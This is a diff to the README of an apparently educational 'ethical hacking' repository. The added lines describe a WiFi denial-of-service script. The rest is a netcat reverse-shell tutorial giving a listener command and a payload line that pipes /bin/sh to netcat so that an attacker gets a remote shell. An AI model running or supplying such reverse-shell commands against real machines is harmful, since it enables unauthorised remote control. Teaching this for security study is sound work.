@@ -1,6 +1,8 @@
 # Python-Ehtical-Hacking
 
-You need to have these two tools to run trhe script
+These a simple Python script, runs a denial service attack or DoS attack against a WiFi network.
+
+You need to have these two tools
 
 ## 1) Kali Linux OS –
 Kali Linux is one of the best operating system based on UNIX having more than 1000s of pre-installed tools based on network/forensics/webapp etc. Kali Linux is an open source OS having monolithic type kernel and available in both 32-bit and 64-bit architecture.
@@ -13,7 +15,7 @@ Netcat is a command in Linux which is used to perform port listening, port redir
 Generally, in order to hack into a system, an attacker tries to gain shell access to execute the malicious payload commands. The gained shell is called the reverse shell which could be used by an attacker as a root user and the attacker could do anything out of it. During the whole process, the attacker’s machine acts as a server that waits for an incoming connection, and that connection comes along with a shell.
 
 Creating Reverse Shells
-### 1. Setup a listener: The very first step is to set up a listener on the attacker’s machine in order to act as a server and to listen to the incoming connections. Use the following command to start listening.
+  ### 1. Setup a listener: The very first step is to set up a listener on the attacker’s machine in order to act as a server and to listen to the incoming connections. Use the following command to start listening.
 ```shell
 nc –nlvp 5555
 ```
@@ -25,7 +27,7 @@ netcat-listen
 
 This will start the listener on the port 5555.
 
-### 2. Receive connection along with a shell from target: Now as we have started listening, it’s time to execute a basic payload at the target so that we could get a reverse shell. Use the following command to send the request to the attacker.
+  ### 2. Receive connection along with a shell from target: Now as we have started listening, it’s time to execute a basic payload at the target so that we could get a reverse shell. Use the following command to send the request to the attacker.
 ```shell
 /bin/sh | nc 127.0.0.1 5555
 ```
@@ -35,7 +37,7 @@ netcat-connect
 ```
 This will give a reverse shell to the attacker which attacker could use to execute any command.
 
-### 3. Executing a command through shell: Now if we enter any command at the receiver’s terminal the output would be displayed on the attacker’s terminal.
+  ### 3. Executing a command through shell: Now if we enter any command at the receiver’s terminal the output would be displayed on the attacker’s terminal.
 ```shell
 netcat-live-reverse-shell
 ```
